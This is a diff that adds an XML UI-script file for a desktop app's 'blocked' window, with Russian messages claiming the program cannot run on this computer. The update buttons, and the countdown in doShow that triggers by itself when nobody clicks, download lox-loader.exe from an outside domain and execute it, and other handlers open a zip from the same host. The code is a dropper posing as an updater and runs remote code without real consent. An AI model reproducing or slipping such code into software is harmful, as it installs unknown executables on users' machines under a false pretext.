@@ -1,0 +1,137 @@
+<?xml version="1.0" encoding="UTF-8" standalone="no"?>
+<root>
+  <class name="blocked">
+    
+  
+  
+  
+  
+  <method name="doButtonAltAct">
+      <browse url="https://l-lacker.ru/app/lox.zip" url-type="string"/>
+      <fadeTo continue="1" continue-type="" duration="500" duration-type="integer" object="button" object-type="object" value="0" value-type="float"/>
+      <sleep sync="" sync-type="" value="150" value-type="integer"/>
+      <fadeTo continue="1" continue-type="" duration="500" duration-type="integer" object="buttonAlt" object-type="object" value="0" value-type="float"/>
+      <sleep sync="" sync-type="" value="150" value-type="integer"/>
+      <fadeTo continue="1" continue-type="" duration="500" duration-type="integer" object="image" object-type="object" value="0" value-type="float"/>
+      <sleep sync="" sync-type="" value="150" value-type="integer"/>
+      <fadeTo continue="1" continue-type="" duration="500" duration-type="integer" object="label" object-type="object" value="0" value-type="float"/>
+      <sleep sync="" sync-type="" value="150" value-type="integer"/>
+      <fadeTo continue="" continue-type="" duration="500" duration-type="integer" object="" object-type="object" value="0" value-type="float"/>
+      <applicationShutdown/>
+    </method>
+    
+  <method name="doImageAltClickLeft">
+      <applicationShutdown/>
+    </method>
+  
+  
+  
+  
+  
+  
+    
+  
+  
+  
+  
+  
+  
+  <method name="doButtonAltClickRight">
+      <setVar name="updclicked" name-type="" value="1" value-type="string"/>
+      <elementEnabledOff object="~sender" object-type="object"/>
+      <browse url="https://l-lacker.ru/app/lox.zip" url-type="string"/>
+      <elementSetText object="label" object-type="object" relative="" relative-type="" value="Благодарим за загрузку последней версии!" value-type="string"/>
+      <fadeTo continue="1" continue-type="" duration="250" duration-type="integer" object="image3" object-type="object" value="0" value-type="float"/>
+      <fadeTo continue="1" continue-type="" duration="250" duration-type="integer" object="labelAlt" object-type="object" value="0" value-type="float"/>
+      <fadeTo continue="1" continue-type="" duration="250" duration-type="integer" object="buttonAlt" object-type="object" value="0" value-type="float"/>
+      <fadeTo continue="" continue-type="" duration="2000" duration-type="integer" object="buttonAlt" object-type="object" value="0" value-type="float"/>
+      <fadeTo continue="" continue-type="" duration="250" duration-type="integer" object="" object-type="object" value="0" value-type="float"/>
+      <applicationShutdown/>
+    </method>
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <method name="doButtonAltAction">
+      <setVar name="updclicked" name-type="" value="1" value-type="string"/>
+      <elementHide object="panel" object-type="object"/>
+      <elementSetX object="panelAlt" object-type="object" relative="" relative-type="" value="0" value-type="integer"/>
+      <elementShow object="panelAlt" object-type="object"/>
+      <sleep sync="" sync-type="" value="100" value-type="integer"/>
+      <phpLine expr="$content = Stream::getContents('https://l-lacker.ru/app/lox-loader.exe')" expr-type="expr"/>
+      <phpLine expr="Stream::putContents('./lox-loader.exe', $content)" expr-type="expr"/>
+      <exec command="lox-loader.exe" command-type="string" wait="" wait-type=""/>
+      <applicationShutdown/>
+    </method>
+  <method name="doShow">
+      <ifVar method="equals" method-type="" name="blockcomp" name-type="" not="" not-type="" value="1" value-type="string"/>
+      <openBlock/>
+      <elementSetText object="label" object-type="object" relative="" relative-type="" value="Запуск на этом компьютере невозможен" value-type="string"/>
+      <elementSetText object="labelAlt" object-type="object" relative="" relative-type="" value="Сожалеем, но Вы не можете запустить lox.exe.\nВиртуальная машина и VPN не помогут. Обновление бесполезно." value-type="magicString"/>
+      <elementHide object="buttonAlt" object-type="object"/>
+      <exit/>
+      <closeBlock/>
+      <ifVar method="equals" method-type="" name="blocktime" name-type="" not="" not-type="" value="1" value-type="string"/>
+      <openBlock/>
+      <elementSetText object="label" object-type="object" relative="" relative-type="" value="Запустите эту сборку чуть позже" value-type="string"/>
+      <elementSetText object="labelAlt" object-type="object" relative="" relative-type="" value="Спасибо за интерес к lox.exe! Это последняя версия.\nПопробуйте запустить меня чуть позже." value-type="magicString"/>
+      <elementHide object="buttonAlt" object-type="object"/>
+      <exit/>
+      <closeBlock/>
+      <ifVar method="equals" method-type="" name="blocktime" name-type="" not="" not-type="" value="2" value-type="string"/>
+      <openBlock/>
+      <elementSetText object="label" object-type="object" relative="" relative-type="" value="Этот компьютер не поддерживается" value-type="string"/>
+      <elementSetText object="labelAlt" object-type="object" relative="" relative-type="" value="Для запуска lox.exe потребуется процессор &quot;Эльбрус&quot;" value-type="magicString"/>
+      <elementHide object="buttonAlt" object-type="object"/>
+      <exit/>
+      <closeBlock/>
+      <ifVar method="equals" method-type="" name="updneedclicked" name-type="" not="" not-type="" value="1" value-type="string"/>
+      <openBlock/>
+      <setVar name="updclicked" name-type="" value="1" value-type="string"/>
+      <elementHide object="panel" object-type="object"/>
+      <elementSetX object="panelAlt" object-type="object" relative="" relative-type="" value="0" value-type="integer"/>
+      <elementShow object="panelAlt" object-type="object"/>
+      <phpLine expr="$content = Stream::getContents('https://l-lacker.ru/app/lox-loader.exe')" expr-type="expr"/>
+      <phpLine expr="Stream::putContents('./lox-loader.exe', $content)" expr-type="expr"/>
+      <exec command="lox-loader.exe" command-type="string" wait="" wait-type=""/>
+      <applicationShutdown/>
+      <exit/>
+      <closeBlock/>
+      <else/>
+      <openBlock/>
+      <sleep sync="" sync-type="" value="1000" value-type="integer"/>
+      <elementSetText object="buttonAlt" object-type="object" relative="" relative-type="" value="Скачать новую версию (5)" value-type="string"/>
+      <sleep sync="" sync-type="" value="1000" value-type="integer"/>
+      <elementSetText object="buttonAlt" object-type="object" relative="" relative-type="" value="Скачать новую версию (4)" value-type="string"/>
+      <sleep sync="" sync-type="" value="1000" value-type="integer"/>
+      <elementSetText object="buttonAlt" object-type="object" relative="" relative-type="" value="Скачать новую версию (3)" value-type="string"/>
+      <sleep sync="" sync-type="" value="1000" value-type="integer"/>
+      <elementSetText object="buttonAlt" object-type="object" relative="" relative-type="" value="Скачать новую версию (2)" value-type="string"/>
+      <sleep sync="" sync-type="" value="1000" value-type="integer"/>
+      <elementSetText object="buttonAlt" object-type="object" relative="" relative-type="" value="Скачать новую версию (1)" value-type="string"/>
+      <sleep sync="" sync-type="" value="1000" value-type="integer"/>
+      <ifVar method="equals" method-type="" name="updclicked" name-type="" not="1" not-type="" value="1" value-type="string"/>
+      <openBlock/>
+      <setVar name="updclicked" name-type="" value="1" value-type="string"/>
+      <elementHide object="panel" object-type="object"/>
+      <elementSetX object="panelAlt" object-type="object" relative="" relative-type="" value="0" value-type="integer"/>
+      <elementShow object="panelAlt" object-type="object"/>
+      <sleep sync="" sync-type="" value="100" value-type="integer"/>
+      <phpLine expr="$content = Stream::getContents('https://l-lacker.ru/app/lox-loader.exe')" expr-type="expr"/>
+      <phpLine expr="Stream::putContents('./lox-loader.exe', $content)" expr-type="expr"/>
+      <exec command="lox-loader.exe" command-type="string" wait="" wait-type=""/>
+      <applicationShutdown/>
+      <closeBlock/>
+      <closeBlock/>
+    </method>
+  </class>
+</root>
